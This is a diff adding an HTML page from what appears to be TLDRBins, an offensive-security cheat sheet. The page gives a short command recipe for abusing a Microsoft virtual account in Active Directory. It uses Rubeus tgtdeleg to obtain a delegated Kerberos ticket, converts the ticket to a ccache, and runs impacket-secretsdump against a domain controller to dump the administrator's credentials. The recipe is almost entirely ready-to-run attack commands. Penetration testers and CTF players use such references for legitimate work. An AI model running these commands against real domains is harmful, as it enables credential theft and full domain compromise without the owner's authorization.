@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Machine Account | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/machine_account/">
+      <span>Machine Account</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@machine-account/">Machine Account</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@microsoft-virtual-account/">Microsoft Virtual Account</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@ad/">Ad</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@domain-controller/">Domain Controller</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@rubeus/">Rubeus</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@kerberos/">Kerberos</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="abuse-1--microsoft-virtual-account">Abuse #1 : Microsoft virtual account</h3>
+<h4 id="1-create-a-ticket-from-microsoft-virtual-account">1. Create a ticket from Microsoft virtual account</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">tgtdeleg</span> <span class="p">/</span><span class="n">nowrap</span>
+</span></span></code></pre></div><h4 id="2-convert-kirbi-to-ccache-back-to-linux">2. Convert kirbi to ccache (Back to Linux)</h4>
+<p><a href="https://github.com/SolomonSklash/RubeusToCcache">RubeusToCcache</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 rubeustoccache.py &lt;base64_encoded_ticket&gt; secrets.kirbi secrets.ccache
+</span></span></code></pre></div><h4 id="3-dump-secrets">3. Dump Secrets</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>secrets.ccache
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-secretsdump -k -no-pass -just-dc-user administrator
+</span></span></code></pre></div><br></div></div>
+    
+    <script src="/js/utils.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
